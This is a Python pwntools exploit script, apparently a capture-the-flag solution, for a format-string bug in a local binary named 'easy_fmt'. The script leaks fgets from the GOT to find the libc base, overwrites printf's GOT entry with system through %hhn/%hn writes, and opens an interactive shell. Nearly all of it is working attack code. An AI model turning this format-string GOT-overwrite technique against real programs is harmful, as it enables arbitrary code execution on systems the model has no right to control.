#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./easy_fmt')
elf = ELF('./easy_fmt')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# aaaaaaaa%6$p

'''
this will not worked,because \x00 cut off the string.

payload = p64(elf.got['fgets']) + '{%6$s}'
'''

'''
6           7
| %7$s aa.. | fgets@got |
'''
payload = '%7$s|'.ljust(8,'a') + p64(elf.got['fgets'])
r.sendline(payload)

libc_base = u64(r.recvuntil('|')[:-1].ljust(8,'\x00')) - libc.symbols['fgets']
print '[*] libc base : ',hex(libc_base)

system_addr = libc_base + libc.symbols['system']
print '[*] system addr : ',hex(system_addr)

'''
6                                9        10         
| %c%9$hhn | %c%10$hn | aaaaa... | printf | printf + 1 |
<-             24bytes          ->
'''

a = system_addr & 0xff
b = (system_addr >> 8) & 0xffff

payload = '%{}c%9$hhn'.format(a)  
payload+= '%{}c%10$hn'.format(b - a) 
payload = payload.ljust(24,'a')
payload+= p64(elf.got['printf']) # 9
payload+= p64(elf.got['printf'] + 1) #10
raw_input('#')
r.sendline(payload)

r.interactive()
